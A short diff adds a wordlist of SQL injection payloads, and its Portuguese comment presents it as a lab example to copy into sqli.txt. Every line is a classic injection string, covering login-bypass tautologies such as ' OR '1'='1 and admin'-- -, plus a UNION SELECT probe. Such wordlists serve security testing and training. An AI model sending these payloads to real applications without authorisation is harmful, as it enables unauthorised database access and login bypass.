@@ -1,0 +1,7 @@
+# Exemplo de payloads SQLi para laboratório. Copie para sqli.txt e ajuste.
+' OR '1'='1
+' OR 1=1-- -
+" OR "1"="1
+1) OR (1=1
+' UNION SELECT NULL-- -
+admin'-- -
